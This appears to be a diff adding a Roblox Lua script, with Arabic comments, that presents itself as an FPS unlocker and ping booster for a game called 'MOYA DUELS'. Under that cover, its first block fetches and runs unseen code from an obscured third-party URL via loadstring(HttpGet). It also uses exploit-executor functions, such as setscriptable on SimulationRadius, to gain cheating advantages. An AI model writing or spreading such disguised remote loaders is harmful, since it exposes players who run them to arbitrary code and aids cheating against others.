@@ -1,0 +1,60 @@
+--[========================================================]
+-- MOYA DUELS - Ultra Fast Loader + 120+ FPS Unlocker + Ping Booster
+-- Keeps full game graphics intact
+--[========================================================]
+
+local RunService = game:GetService("RunService")
+local UserSettings = UserSettings()
+local GameSettings = UserSettings:GetService("UserGameSettings")
+local Players = game:GetService("Players")
+local localPlayer = Players.LocalPlayer
+
+-- 1. تسريع الفتح وتحميل السكريبت الأصلي في الخلفية وبسرعة قصوى
+task.spawn(function()
+    pcall(function()
+        -- محاولة تسريع الاستجابة والتحميل
+        if setscriptable then
+            setscriptable(localPlayer, "SimulationRadius", true)
+        end
+    end)
+    
+    -- تحميل السكريبت الأصلي الخاص بك فوراً وبدون قيود
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://orrxl4-protector.com/api/raw?id=dvmejzph"))()
+    end)
+    
+    if not success then
+        warn("[MOYA] خطأ في تحميل السكريبت الأساسي: " .. tostring(err))
+    end
+end)
+
+-- 2. بوست إنترنت وتقليل البينج (Network & Packet Optimization)
+task.spawn(function()
+    pcall(function()
+        settings():GetService("NetworkSettings").IncomingReplicationLag = 0
+        if localPlayer and localPlayer:FindFirstChild("PlayerGui") then
+            -- تحسين تدفق البيانات وسرعة الاستجابة مع السيرفر
+            localPlayer.ReplicationFocus = workspace
+        end
+    end)
+end)
+
+-- 3. جلب أقصى فريمات يقدر الجهاز يجيبها (يدعم 60, 90, 120, 144 فريم وأعلى)
+task.spawn(function()
+    pcall(function()
+        -- إيقاف حدود الفريمات الافتراضية للعبة
+        if setfpscap then
+            setfpscap(9999) -- يفتح الفريمات لأقصى حد ممكن يقبله هاردوير جهازك
+        end
+        
+        -- تثبيت إعدادات الجرافيك بأعلى جودة من غير ما تحذف أي مظهر أو تفاصيل
+        RunService.RenderStepped:Connect(function()
+            pcall(function()
+                GameSettings.SavedQualityLevel = Enum.SavedQualityLevel.Level21 -- أعلى جرافيك
+                workspace.GlobalShadows = true
+            end)
+        end)
+    end)
+end)
+
+print("[MOYA] تم تفعيل سكريبت السرعة، بوست النت، وفتح أقصى فريمات مع الحفاظ على الجرافيك بنجاح!")
